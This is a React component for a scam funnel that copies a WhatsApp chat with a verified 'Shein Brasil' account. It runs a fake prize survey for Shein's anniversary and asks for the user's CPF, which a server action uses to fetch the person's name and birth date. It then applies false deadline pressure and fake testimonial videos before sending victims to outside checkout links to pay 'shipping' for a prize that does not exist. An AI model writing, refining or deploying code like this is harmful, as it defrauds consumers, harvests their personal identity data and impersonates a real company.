"use client"

import { useEffect, useState, useRef, useCallback, useMemo } from "react"
import { Check } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { verifyCpf } from "./actions" // Importa o Server Action

// Dados fictícios do usuário (USER_NAME e USER_DOB_OPTION foram removidos, o nome e nascimento virão da API)
const USER_CPF = "12758539874" // Este CPF será o "válido" para a simulação

const CheckIcon = () => (
  <svg width="16" height="12" viewBox="0 0 16 12" className="text-[#60d550] ml-1">
    <path
      fill="currentColor"
      d="M15.01 3.316l-.478-.372a.365.365 0 0 0-.51.063L8.666 9.879a.32.32 0 0 1-.484.033l-.358-.325a.319.319 0 0 0-.484.032l-.378.483a.418.418 0 0 0 .036.541l1.32 1.266c.143.14.361.125.484-.033l6.272-8.048a.366.366 0 0 0-.064-.512zm-4.1 0l-.478-.372a.365.365 0 0 0-.51.063L4.566 9.879a.32.32 0 0 1-.484.033L1.891 7.769a.366.366 0 0 0-.515.006l-.423.433a.364.364 0 0 0 .006.514l3.258 3.185c.143.14.361.125.484-.033l6.272-8.048a.365.365 0 0 0-.063-.51z"
    />
  </svg>
)

export default function WhatsAppFunnelDemo() {
  const [conversation, setConversation] = useState<
    Array<{
      type: "bot" | "user" | "image" | "video" | "button-group" | "status-message" | "loading"
      content: string | string[] | { text: string; options: string[] }
      timestamp?: string
      avatar?: string
      isTyping?: boolean
    }>
  >([])
  const [currentStep, setCurrentStep] = useState(0)
  const [isTyping, setIsTyping] = useState(false)
  const [status, setStatus] = useState("Online")
  const [userName, setUserName] = useState<string | undefined>(undefined) // Usando useState para o nome do usuário
  const [userDob, setUserDob] = useState<string | undefined>(undefined) // Novo estado para a data de nascimento
  const [selectedPrizeOption, setSelectedPrizeOption] = useState<string | undefined>(undefined) // Novo estado para a opção de prêmio selecionada
  const [awaitingInput, setAwaitingInput] = useState<string | null>(null) // Novo estado para controlar o input de texto
  const messagesEndRef = useRef<HTMLDivElement>(null)

  // Referência para o objeto de áudio
  const audioRef = useRef<HTMLAudioElement | null>(null)

  useEffect(() => {
    // Inicializa o objeto de áudio uma vez
    audioRef.current = new Audio("/whatsapp-notification.mp3")
  }, [])

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
  }

  const addMessage = useCallback((message: any) => {
    setConversation((prev) => {
      // Se a mensagem for do bot, tenta tocar o áudio
      if (message.type === "bot" && audioRef.current) {
        audioRef.current.play().catch((e) => console.error("Erro ao tocar áudio:", e))
      }
      return [
        ...prev,
        { ...message, timestamp: new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" }) },
      ]
    })
  }, [])

  const simulateTyping = useCallback(async (duration = 1500) => {
    setIsTyping(true)
    setStatus("digitando...")
    await new Promise((resolve) => setTimeout(resolve, duration))
    setIsTyping(false)
    setStatus("Online")
  }, [])

  // Definir funnelSteps com useMemo para que seja recriado quando userName ou userDob mudar
  const funnelSteps = useMemo(
    () => [
      // Step 0: Initial Welcome & Info
      async () => {
        addMessage({ type: "status-message", content: "Esta é uma conta comercial e não recebe ligações" })
        await simulateTyping()
        addMessage({ type: "bot", content: "Parabéns! Você foi selecionada para o questionário Shein 17 anos..." })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Olá! Seja bem vinda ao **questionário premiado** em comemoração aos 17 anos da Shein!",
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Sou a Fernanda, atendente virtual da Shein e vou te auxiliar no seu **questionário premiado**! 🥰",
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `Hoje quarta-feira, ${new Date().toLocaleDateString("pt-BR", { day: "2-digit", month: "long", year: "numeric" })} é o **último dia** para responder o questionário e resgatar a sua premiação caso esteja qualificada.`,
        })
        await simulateTyping()
        addMessage({
          type: "button-group",
          content: {
            text: "Clique aqui para iniciar o questionário",
            options: ["Clique aqui para iniciar o questionário"],
          },
        })
      },
      // Step 1: CPF Request & Verification
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Antes de prosseguirmos, devo informar que o questionário é limitado a 1 resposta por CPF.",
        })
        await simulateTyping()
        addMessage({ type: "bot", content: "Para começarmos, preciso que me informe o número do seu CPF." })
        setAwaitingInput("CPF") // Solicita input de CPF
      },
      async (userResponse: string) => {
        setAwaitingInput(null) // Esconde o input
        addMessage({ type: "loading", content: "Verificando CPF..." }) // Adiciona mensagem de carregamento
        const result = await verifyCpf(userResponse) // Chama o Server Action
        setConversation((prev) => prev.filter((msg) => msg.type !== "loading")) // Remove a mensagem de carregamento

        if (result.success) {
          setUserName(result.name) // Atualiza o estado com o nome da API
          setUserDob(result.nascimento) // Atualiza o estado com a data de nascimento da API
          addMessage({ type: "bot", content: result.message })
          await simulateTyping()
          addMessage({ type: "bot", content: "Seus dados estão qualificados para nosso questionário!" })
          await simulateTyping()
          // Usa o nome da API se disponível, caso contrário, usa um fallback genérico
          addMessage({
            type: "bot",
            content: `${result.name || "usuário"}, seu nome está correto?`,
          })
          addMessage({ type: "button-group", content: { text: "Sim", options: ["Sim"] } })
        } else {
          addMessage({ type: "bot", content: result.message })
          await simulateTyping()
          addMessage({ type: "bot", content: "Por favor, tente novamente ou entre em contato com o suporte." })
          setAwaitingInput("CPF") // Volta para a etapa de input de CPF
          setCurrentStep(1) // Reinicia o passo para o input de CPF
          return // Impede o avanço do funil
        }
      },
      // Step 2: Date of Birth Confirmation
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Para confirmar que realmente estamos falando com a pessoa certa, confirme sua data de nascimento:",
        })

        const dobOptions = []
        if (userDob) {
          dobOptions.push(`Opção 01 - ${userDob}`)
        } else {
          // Fallback se userDob não estiver disponível (ex: API não retornou)
          dobOptions.push("Opção 01 - 30/07/2000") // Data padrão
        }
        // Adiciona outras opções fixas incorretas
        dobOptions.push("Opção 02 - 22/04/1988")
        dobOptions.push("Opção 03 - 04/12/2001")

        addMessage({
          type: "button-group",
          content: {
            text: "Qual opção está correta?",
            options: dobOptions,
          },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `${userName || "usuário"}, seja bem vinda ao questionário premiado Shein, o tempo de duração média é de 2 a 5 minutos, vamos começar!`,
        })
        await simulateTyping()
        // Step 3: Question 1 (Já adquiriu Shein?)
        addMessage({ type: "image", content: "/shein-gifts-cart.png" }) // Imagem: Produtos Shein em um carrinho
        addMessage({ type: "bot", content: "Pergunta 01: Você já adquiriu algum produto da Shein?" })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Sim, já sou cliente", "Ainda não sou cliente", "Não sei"] },
        })
      },
      // Step 4: Question 1.1 (O que mais te chama atenção?)
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-store.png" }) // Imagem: Loja física Shein
        addMessage({ type: "bot", content: "O que mais te chama atenção em nossos produtos?" })
        addMessage({
          type: "button-group", // Alterado para button-group
          content: {
            text: "",
            options: ["Qualidade", "Tecnologia e inovação", "Design", "Suporte ao cliente", "Outro"],
          },
        })
      },
      async () => {
        await simulateTyping()
        addMessage({ type: "bot", content: "Agradecemos sua resposta!" })
        await simulateTyping()
        addMessage({ type: "bot", content: "Vamos para a próxima pergunta..." })
        await simulateTyping()
        // Step 5: Question 2 (Frequência de compras)
        addMessage({ type: "image", content: "/shein-packages-woman.png" }) // Imagem: Mulher sorrindo com pacotes
        addMessage({ type: "bot", content: "Pergunta 02: Com que frequência você faz compras na Shein?" })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Semanalmente", "Mensalmente", "A cada dois meses", "Raramente"] },
        })
      },
      // Step 6: Question 3 (Tipos de produtos)
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-shopping-bags.png" }) // Imagem: Duas pessoas segurando sacolas SHEIN
        addMessage({ type: "bot", content: "Pergunta 03: Quais tipos de produtos você mais compra na Shein?" })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Roupas femininas", "Roupas masculinas", "Roupas infantis", "Calçados"] },
        })
      },
      // Step 7: Question 4 (Fatores importantes)
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-app-shopping-cart.png" }) // Imagem: Carrinho de compras e logo SHEIN
        addMessage({
          type: "bot",
          content: "Pergunta 04: Quais são os fatores mais importantes para você ao escolher um produto na Shein?",
        })
        addMessage({
          type: "button-group",
          content: {
            text: "",
            options: ["Preço", "Qualidade", "Estilo", "Tendências da moda", "Comentários de outros clientes"],
          },
        })
      },
      // Step 8: Question 5 (Experiência de navegação)
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-app-screen.png" }) // Imagem: Tela de celular mostrando o app Shein
        addMessage({
          type: "bot",
          content: "Pergunta 05: Qual é a sua experiência geral de navegação no site/app da Shein?",
        })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Muito fácil", "Fácil", "Neutra", "Difícil", "Muito difícil"] },
        })
      },
      // Step 9: Question 6 (Satisfação com entrega)
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-delivery-box.png" }) // Imagem: Caixas SHEIN sendo manuseadas
        addMessage({
          type: "bot",
          content: "Pergunta 06: Quão satisfeita você está com o tempo de entrega dos produtos da Shein?",
        })
        addMessage({
          type: "button-group",
          content: {
            text: "",
            options: ["Muito satisfeito", "Satisfeita", "Neutra", "Insatisfeita", "Muito Insatisfeita"],
          },
        })
      },
      // Step 10: Question 7 (Estilos de roupa)
      async () => {
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-clothing-styles.png" }) // Imagem: Estilos de roupa SHEIN
        addMessage({ type: "bot", content: "Pergunta 07: Quais estilos de roupa você gostaria de ver mais na Shein?" })
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Casual", "Esportivo", "Formal", "Vintage", "Alternativo"] },
        })
      },
      // Step 11: Choose Product to Win (User selects an option here)
      async (userResponse: string) => {
        await simulateTyping()
        addMessage({ type: "bot", content: "Escolha a opção abaixo de qual produto você gostaria de ganhar:" })
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-makeup-kit.png" }) // Imagem: Kit de Maquiagem Shein
        addMessage({ type: "bot", content: "Opção 01: ✅\nKits Maquiagem Shein - Valor de até R$1.000,00." })
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-clothes-woman.png" }) // Imagem: Mulheres com roupas Shein
        addMessage({
          type: "bot",
          content: "Opção 02: ✅\nEscolha os Looks que desejar - Tema Livre - Valor de até R$1.000,00.",
        })
        await simulateTyping()
        addMessage({ type: "image", content: "/shein-home-items.png" }) // Imagem: Itens de casa Shein
        addMessage({
          type: "bot",
          content: "Opção 03: ✅\nEscolha os Utensílios para casa - Tema Livre - Valor de até R$1.000,00.",
        })
        addMessage({ type: "button-group", content: { text: "", options: ["Opção 01", "Opção 02", "Opção 03"] } })
      },

      // Passo 12: Testimonials & Justification for Prize (Videos FIRST)
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "Antes de prosseguirmos com sua premiação, veja o que algumas pessoas nos mandam diariamente 🥰",
        })

        // Vídeo 1
        await simulateTyping()
        addMessage({ type: "video", content: "/video/video-1.mp4" })
        await new Promise((resolve) => setTimeout(resolve, 30000))

        // Vídeo 2
        await simulateTyping()
        addMessage({ type: "video", content: "/video/video-2.mp4" })
        await new Promise((resolve) => setTimeout(resolve, 20000))

        // Vídeo 3
        await simulateTyping()
        addMessage({ type: "video", content: "/video/video-3.mp4" })
        await new Promise((resolve) => setTimeout(resolve, 20000))

        // Adiciona botão para o usuário avançar manualmente
        await simulateTyping()
        addMessage({
          type: "button-group",
          content: { text: "", options: ["Já vi os vídeos"] },
        })
      },

      // Passo 13: Justification for Prize (Input AFTER vídeos)
      async (userResponse: string) => {
        // Só avança se o usuário clicar no botão "Já vi os vídeos"
        if (userResponse === "Já vi os vídeos") {
          let prizeName = "o prêmio"
          if (selectedPrizeOption === "Opção 01") {
            prizeName = "o kit de maquiagem da Shein"
          } else if (selectedPrizeOption === "Opção 02") {
            prizeName = "as roupas da Shein"
          } else if (selectedPrizeOption === "Opção 03") {
            prizeName = "os utensílios para casa da Shein"
          }

          await simulateTyping()
          addMessage({
            type: "bot",
            content: `${userName || "usuário"}, por que você gostaria de ganhar ${prizeName}?`,
          })
          setAwaitingInput("adoro roupas")
        }
      },

      // Passo 14: Rating Question
      async (userResponse: string) => {
        setAwaitingInput(null) // Esconde o input após o usuário fornecer a resposta
        await simulateTyping()
        addMessage({ type: "bot", content: "De 0 a 5, qual a nota você nos dá sobre as nossas roupas?" })
        addMessage({ type: "button-group", content: { text: "", options: ["0", "1", "2", "3", "4", "5"] } })
      },

      // Passo 15: Prize Confirmation & Conditional Size/Freight Options
      async (userResponse: string) => {
        // userResponse aqui é a avaliação
        await simulateTyping()
        addMessage({ type: "bot", content: "Aguarde alguns segundos enquanto eu verifico suas respostas..." })
        await simulateTyping(2000)
        addMessage({ type: "bot", content: "Respostas verificadas!" })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `${userName || "usuário"}, tenho uma ótima notícia pra você!`,
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "🎉 Parabéns! Você está qualificada para ganhar as roupas tema livre da Shein!",
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: "De acordo com as regras do nosso questionário premiado, as Roupas Temas Livre sairá por R$0,00.",
        })
        await simulateTyping()
        addMessage({ type: "bot", content: "Isso mesmo, o aniversário é nosso e quem ganha é você!" })

        // Lógica condicional para o próximo passo (tamanho ou frete)
        await simulateTyping() // Simula digitação para a próxima mensagem
        if (selectedPrizeOption === "Opção 02") {
          // Se roupas foram escolhidas
          addMessage({ type: "bot", content: "Escolha o tamanho das peças do seu Kit para a entrega:" })
          addMessage({ type: "button-group", content: { text: "", options: ["PP", "P", "M", "G"] } })
        } else {
          // Se maquiagem ou itens de casa foram escolhidos, pula a seleção de tamanho.
          // Adiciona diretamente o vídeo 4 e as opções de frete.
          addMessage({ type: "video", content: "/video/video-4.mp4" })
          await simulateTyping()
          addMessage({
            type: "button-group",
            content: {
              text: "",
              options: ["Por que preciso pagar o frete?", "Prosseguir com o recebimento do prêmio"],
            },
          })
        }
      },

      // Passo 16: Lida com Resposta de Tamanho OU Explicação/Prosseguir com Frete
      async (userResponse: string) => {
        // Verifica se a resposta é uma das opções de tamanho
        const isSizeResponse = ["PP", "P", "M", "G"].includes(userResponse)

        if (isSizeResponse) {
          await simulateTyping()
          addMessage({ type: "bot", content: `Ok, tamanho ${userResponse} selecionado!` })
          await simulateTyping()

          // Agora adiciona o vídeo 4 e as opções de frete
          addMessage({ type: "video", content: "/video/video-4.mp4" })
          await simulateTyping()
          addMessage({
            type: "button-group",
            content: {
              text: "",
              options: ["Por que preciso pagar o frete?", "Prosseguir com o recebimento do prêmio"],
            },
          })
        } else if (userResponse === "Por que preciso pagar o frete?") {
          await simulateTyping()
          addMessage({
            type: "bot",
            content:
              "A Shein está realizando seu aniversário de 17 anos e queremos que você faça parte dessa comemoração! A Shein se reserva ao direito de premiar uma pequena parte das pessoas e fechar o questionário quando bem entender.",
          })
          await simulateTyping()
          addMessage({
            type: "bot",
            content:
              "A entrega dos produtos da Shein é realizada por uma empresa TERCEIRIZADA, qual conseguimos um desconto em comemoração de 17 anos da empresa. Por fim, todos os nossos custos levando em conta produção e fábrica dos produtos ficará por nossa conta e você pagará somente o valor de custo de transporte da empresa terceirizada.",
          })
          await simulateTyping()
          addMessage({
            type: "button-group",
            content: { text: "", options: ["Prosseguir com o recebimento do prêmio"] },
          })
        } else {
          await simulateTyping()
          addMessage({
            type: "bot",
            content: `${userName || "usuário"}, agora escolha o melhor frete para você!`,
          })
          await simulateTyping()
          addMessage({
            type: "button-group",
            content: {
              text: "",
              options: [
                "Frete Express - 7 a 10 dias úteis - R$23,68",
                "Frete Advanced - 3 a 5 dias úteis - R$29,82",
                "Frete Full - 1 dia útil - R$35,40",
              ],
            },
          })
        }
      },

      // Passo 17: Opções Finais de Frete
      async () => {
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `Lembre-se que hoje quarta-feira, ${new Date().toLocaleDateString("pt-BR", { day: "2-digit", month: "long", year: "numeric" })} é o último dia para resgatar seu prêmio, e caso você não conclua a etapa a seguir seu prêmio será expirado e dará oportunidade para outro participante.`,
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content: `${userName || "usuário"}, você será redirecionada para uma página onde deverá preencher as suas informações e concluir a inscrição para garantir o recebimento do seu prêmio.`,
        })
        await simulateTyping()
        addMessage({
          type: "bot",
          content:
            "Eu vou entrar em contato com você pessoalmente após a sua inscrição para confirmar o endereço e garantir a sua entrega! 🥰",
        })
        // Fim do funil
      },
    ],
    [userName, userDob, addMessage, simulateTyping, selectedPrizeOption],
  ) // Dependências para useMemo

  useEffect(() => {
    // Apenas inicia o primeiro passo quando o componente é montado
    if (currentStep === 0) {
      funnelSteps[0]("")
    }
  }, [currentStep, funnelSteps]) // Depende apenas de currentStep e funnelSteps para o carregamento inicial

  useEffect(() => {
    scrollToBottom()
  }, [conversation])

 const handleUserAction = useCallback(
  async (response: string) => {
    // --- REDIRECIONAMENTO PARA OS CHECKOUTS DOS FRETES ---
    if (response === "Frete Express - 7 a 10 dias úteis - R$23,68") {
      window.location.href = "https://pay.lojaprotegida.shop/bz5KZbVe0o9Z7dL"
      return
    }
    if (response === "Frete Advanced - 3 a 5 dias úteis - R$29,82") {
      window.location.href = "https://pay.lojaprotegida.shop/PyE2Zy8jv7K3qRb"
      return
    }
    if (response === "Frete Full - 1 dia útil - R$35,40") {
      window.location.href = "https://pay.lojaprotegida.shop/7vJOGY4KW88ZKXd"
      return
    }
    // -----------------------------------------------------

    const steps = funnelSteps // Obtém a versão mais recente das etapas do funil
    addMessage({ type: "user", content: response }) // Adiciona mensagem do usuário AQUI, e apenas AQUI

    // Define a opção de prêmio selecionada quando o usuário responde ao Passo 11
    if (currentStep === 11) {
      setSelectedPrizeOption(response)
    }

    // Determine the next step function
    const nextStepFunction = steps[currentStep + 1]

    if (nextStepFunction) {
      // Se o passo atual for 13 (Justificativa para o Prêmio) e estamos aguardando input,
      // chamamos a função do próximo passo, mas NÃO incrementamos currentStep aqui.
      // O incremento ocorrerá quando o input for de fato enviado (tratado no onClick/onKeyDown do Input).
      if (currentStep === 13 && awaitingInput) {
        await nextStepFunction(response)
      }
      // Se o passo atual for 16 (Lida com Tamanho/Frete)
      // E a resposta do usuário for "Por que preciso pagar o frete?",
      // então NÃO incrementa o passo, efetivamente permanecendo no mesmo passo.
      else if (currentStep === 16 && response === "Por que preciso pagar o frete?") {
        await nextStepFunction(response) // Ainda executa a função para o passo atual
      } else {
        // Para todos os outros casos, executa a função do próximo passo e incrementa currentStep.
        await nextStepFunction(response)
        setCurrentStep((prev) => prev + 1)
      }
    }
  },
  [currentStep, funnelSteps, addMessage, simulateTyping, setSelectedPrizeOption, awaitingInput],
)

  const renderMessageContent = (message: any) => {
    switch (message.type) {
      case "bot":
        return (
          <div className="relative bg-white rounded-lg p-2 max-w-[85%] shadow-sm rounded-bl-none">
            <p
              className="text-sm"
              dangerouslySetInnerHTML={{ __html: message.content.replace(/\*\*(.*?)\*\*/g, "<strong>$1</strong>") }}
            />
            <div className="absolute bottom-0 right-1 flex items-center">
              <CheckIcon />
            </div>
          </div>
        )
      case "user":
        return (
          <div className="relative bg-[#dcf8c6] rounded-lg p-2 max-w-[85%] shadow-sm rounded-br-none self-end">
            <p className="text-sm">{message.content}</p>
            <div className="absolute bottom-0 right-1 flex items-center">
              <CheckIcon />
            </div>
          </div>
        )
      case "image":
        return (
          <div className="max-w-[85%] rounded-lg overflow-hidden shadow-sm">
            <img
              src={message.content || "/placeholder.svg"}
              alt="Shein Promotion"
              className="w-full h-auto object-cover"
            />
          </div>
        )
      case "video":
        return (
          <div className="max-w-[85%] rounded-lg overflow-hidden shadow-sm relative">
            <video
              playsInline
              webkit-playsinline="true"
              autoPlay
              className="w-full h-auto"
              onClick={(e) => {
                const videoElement = e.target as HTMLVideoElement
                if (videoElement.paused) {
                  videoElement.play()
                } else {
                  videoElement.pause()
                }
              }}
            >
              <source src={message.content} type="video/mp4" />
              Seu navegador não suporta o elemento de vídeo.
            </video>
          </div>
        )
      case "button-group":
        return (
          <div className="flex flex-col gap-2 w-full max-w-[85%]">
            {message.content.text && <p className="text-sm text-gray-600 mb-1">{message.content.text}</p>}
            {message.content.options.map((option: string, idx: number) => (
              <Button
                key={idx}
                className="bg-[#25d366] hover:bg-[#1da851] text-white font-bold py-2 px-4 rounded-full text-sm shadow-md"
                onClick={() => handleUserAction(option)}
              >
                {option}
              </Button>
            ))}
          </div>
        )
      case "status-message":
        return (
          <div className="flex justify-center w-full">
            <div className="bg-[#e0f2f1] rounded-lg p-2 flex items-center gap-2 text-sm max-w-[90%]">
              <div className="w-5 h-5 rounded-full bg-[#4b5e63] flex items-center justify-center text-white text-xs">
                i
              </div>
              <span className="text-[#53676b]">{message.content}</span>
            </div>
          </div>
        )
      case "loading":
        return (
          <div className="flex justify-start items-end">
            <div className="w-8 h-8 rounded-full overflow-hidden mr-2 flex-shrink-0 bg-white flex items-center justify-center">
              <img src="/shein-logo.png" alt="Shein Logo" className="w-5 h-5 object-contain" />
            </div>
            <div className="bg-white rounded-lg p-3 shadow-sm">
              <div className="flex space-x-1">
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                <div
                  className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"
                  style={{ animationDelay: "0.1s" }}
                ></div>
                <div
                  className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"
                  style={{ animationDelay: "0.2s" }}
                ></div>
              </div>
              <span className="text-sm text-gray-500 ml-2">{message.content}</span>
            </div>
          </div>
        )
      default:
        return null
    }
  }

  useEffect(() => {
    // Injeta o script do Meta Pixel exatamente como fornecido
    const script = document.createElement("script")
    script.innerHTML = `
      !function(f,b,e,v,n,t,s)
      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
      n.queue=[];t=b.createElement(e);t.async=!0;
      t.src=v;s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)}(window, document,'script',
      'https://connect.facebook.net/en_US/fbevents.js');
      fbq('init', '1433378440999073');
      fbq('track', 'PageView');
    `
    document.head.appendChild(script)

    // Opcional: cleanup para evitar múltiplas injeções em hot reload
    return () => {
      document.head.removeChild(script)
    }
  }, [])

  return (
    <div className="max-w-md mx-auto bg-white h-screen flex flex-col overflow-hidden">
      {/* Opcional: noscript para fallback */}
      <noscript>
        <img
          height="1"
          width="1"
          style={{ display: "none" }}
          src="https://www.facebook.com/tr?id=1433378440999073&ev=PageView&noscript=1"
          alt=""
        />
      </noscript>
      {/* Header do WhatsApp */}
      <div className="bg-[#075e54] text-white p-3 flex items-center gap-3 shadow-md z-10">
        <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="h-5 w-5"
          >
            <path d="M19 12H5M12 5l-7 7 7 7" />
          </svg>
        </Button>

        <div className="flex items-center gap-3 flex-1">
          <div className="w-10 h-10 rounded-full overflow-hidden bg-white flex items-center justify-center">
            <img src="/shein-logo.png" alt="Shein Logo" className="w-6 h-6 object-contain" />
          </div>

          <div className="flex-1">
            <div className="flex items-center gap-1">
              <span className="font-semibold text-base">Shein Brasil</span>
              {/* Ícone de verificado */}
              <svg viewBox="0 0 18 18" height="16" width="16" className="text-[#60d550]">
                <polygon
                  fill="currentColor"
                  points="9,16 7.1,16.9 5.8,15.2 3.7,15.1 3.4,13 1.5,12 2.2,9.9 1.1,8.2 2.6,6.7 2.4,4.6 4.5,4 5.3,2 7.4,2.4 9,1.1 10.7,2.4 12.7,2 13.6,4 15.6,4.6 15.5,6.7 17,8.2 15.9,9.9 16.5,12 14.7,13 14.3,15.1 12.2,15.2 10.9,16.9"
                />
                <polygon fill="white" points="13.1,7.3 12.2,6.5 8.1,10.6 5.9,8.5 5,9.4 8,12.4" />
              </svg>
            </div>
            <span className="text-xs opacity-90">{status}</span>
          </div>
        </div>

        <div className="flex gap-2">
          <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="h-5 w-5"
            >
              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.63A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
            </svg>
          </Button>
          <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="h-5 w-5"
            >
              <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.2" />
            </svg>
          </Button>
          <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="h-5 w-5"
            >
              <circle cx="12" cy="12" r="1" />
              <circle cx="12" cy="5" r="1" />
              <circle cx="12" cy="19" r="1" />
            </svg>
          </Button>
        </div>
      </div>

      {/* Área de Mensagens com Background */}
      <div
        className="flex-1 p-4 space-y-3 overflow-y-auto flex flex-col"
        style={{
          backgroundImage: "url(/whatsapp-background-new.png)",
          backgroundSize: "contain",
          backgroundRepeat: "repeat",
          backgroundPosition: "center",
        }}
      >
        {conversation.map((message, index) => (
          <div
            key={index}
            className={`flex ${message.type === "user" ? "justify-end" : "justify-start"} ${
              message.type === "button-group" || message.type === "status-message" || message.type === "loading"
                ? "w-full"
                : ""
            } ${message.type === "status-message" ? "my-2" : ""}`}
          >
            {message.type !== "user" && message.type !== "status-message" && message.type !== "loading" && (
              <div className="w-8 h-8 rounded-full overflow-hidden mr-2 flex-shrink-0 bg-white flex items-center justify-center">
                <img src="/shein-logo.png" alt="Shein Logo" className="w-5 h-5 object-contain" />
              </div>
            )}
            {renderMessageContent(message)}
          </div>
        ))}
        <div ref={messagesEndRef} />
      </div>

      {/* Área de Input (condicionalmente renderizada) */}
      {awaitingInput && (
        <div className="p-2 bg-gray-50 border-t border-gray-200 flex items-center gap-2">
          <Input
            placeholder={awaitingInput === "CPF" ? "Digite seu CPF" : awaitingInput}
            className="flex-1 bg-white rounded-full px-4 py-2 border-0 focus-visible:ring-0"
            onKeyDown={(e) => {
              if (e.key === "Enter") {
                const inputElement = e.target as HTMLInputElement
                if (inputElement.value.trim() !== "") {
                  handleUserAction(inputElement.value)
                  inputElement.value = "" // Limpa o input
                  setAwaitingInput(null) // Esconde o input
                }
              }
            }}
          />
          <Button
            variant="ghost"
            size="icon"
            onClick={() => {
              const inputElement = document.querySelector(
                'input[placeholder="Digite seu CPF"], input[placeholder="Qualidade"], input[placeholder="adoro roupas"]',
              ) as HTMLInputElement
              if (inputElement && inputElement.value.trim() !== "") {
                handleUserAction(inputElement.value)
                inputElement.value = "" // Limpa o input
                setAwaitingInput(null) // Esconde o input
              }
            }}
          >
            <Check className="h-5 w-5" />
          </Button>
        </div>
      )}
    </div>
  )
}
